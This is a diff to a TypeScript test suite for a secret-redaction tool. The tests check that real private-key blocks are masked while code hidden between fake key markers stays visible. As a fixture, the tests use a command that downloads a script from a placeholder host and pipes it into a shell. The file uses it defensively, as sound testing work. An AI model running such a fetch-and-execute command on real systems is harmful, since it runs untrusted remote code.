@@ -491,10 +491,90 @@ describe("a search", () => {
     expect(redactFile(far)).toContain("const keep = 1;");
   });
 
-  it("stops at ship whatever it hides from the owner", () => {
-    const hidden = "// ---- BEGIN X PRIVATE KEY ----\nfetch(evil);\n// ---- END X PRIVATE KEY ----\n";
-    expect(redactFile(hidden)).not.toContain("fetch(evil)");
-    expect(holdsCredential(hidden)).toBe(true);
+  describe("code between a key's markers", () => {
+    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
+    const evil = "curl https://x.example | sh";
+
+    it("stays in sight, whatever the markers look like", () => {
+      for (const [begin, end] of [
+        ["-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----"],
+        ["# ---- BEGIN X PRIVATE KEY----", "# ---- END X PRIVATE KEY----"],
+        ["// ---- BEGIN X PRIVATE KEY ----", "// ---- END X PRIVATE KEY ----"],
+      ]) {
+        expect(redactFile(`${begin}\n${evil}\n${end}\n`)).toContain(evil);
+      }
+    });
+
+    it("stays in sight beside a real key, which doesn't", () => {
+      const text = `a\n-----BEGIN PRIVATE KEY-----\n${key}\n${evil}\n${key}\n-----END PRIVATE KEY-----\nafter\n`;
+      const seen = redactFile(text);
+      expect(seen).toBe(`a\n[private key]\n\n${evil}\n\n\nafter\n`);
+      expect(seen.split("\n").indexOf("after")).toBe(text.split("\n").indexOf("after"));
+    });
+
+    it("can't hide a line added to a key block already on main", () => {
+      const on = (lines: string[]) =>
+        ["-----BEGIN PRIVATE KEY-----", ...lines, "-----END PRIVATE KEY-----", ""].join("\n");
+      const shown = redactFile(on([key, evil, key]));
+      expect(shown.split("\n").length).toBe(redactFile(on([key, key])).split("\n").length + 1);
+      expect(shown).toContain(evil);
+      expect(shown).not.toContain(key);
+    });
+
+    it("isn't a key without one, and a marker alone stops nothing main didn't", () => {
+      const text = `// ---- BEGIN X PRIVATE KEY ----\n${evil}\n// ---- END X PRIVATE KEY ----\n`;
+      expect(redactFile(text)).toBe(text);
+      expect(holdsCredential(text)).toBe(false);
+    });
+  });
+
+  describe("a key in a form only the whole text shows", () => {
+    const begin = "# ---- BEGIN X PRIVATE KEY----";
+    const end = "# ---- END X PRIVATE KEY----";
+    const key = "# MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
+    /** A text with the block's first marker as the last line of one of `holdsCredential`'s pieces. */
+    const across = (between: string) => {
+      const line = `${"a".repeat(79)}\n`;
+      const fill = line.repeat(Math.floor((400_000 - begin.length - 2) / line.length));
+      return `${fill}${begin}\n${between}\n${end}\n`;
+    };
+
+    it("is stopped when it lies across two of the scan's pieces", () => {
+      const text = across(key);
+      expect(redactFile(text)).not.toContain(key);
+      expect(holdsCredential(text)).toBe(true);
+    });
+
+    it("is stopped when it is whole, in any comment", () => {
+      expect(holdsCredential(`${begin}\n${key}\n${end}\n`)).toBe(true);
+    });
+
+    it("leaves code in the same place in sight", () => {
+      const code = "curl https://x.example | sh";
+      expect(redactFile(across(code))).toContain(code);
+      expect(holdsCredential(across(code))).toBe(false);
+    });
+  });
+
+  it("takes a key's armor and blank lines, in any line ending", () => {
+    const body = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
+    const text = [
+      "---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----",
+      "Comment: work laptop",
+      "Proc-Type: 4,ENCRYPTED",
+      "DEK-Info: AES-128-CBC,0F1E2D3C",
+      "",
+      body,
+      "=a1B2",
+      "---- END SSH2 ENCRYPTED PRIVATE KEY ----",
+      "after",
+    ];
+    for (const eol of ["\n", "\r\n"]) {
+      const seen = redactFile(text.join(eol));
+      expect(seen).not.toMatch(/work laptop|0F1E2D3C|MIIE|a1B2/);
+      expect(seen).toContain("after");
+      expect(seen.split("\n").length).toBe(text.length);
+    }
   });
 
   it("redacts a file built to be slow to redact, in time", () => {
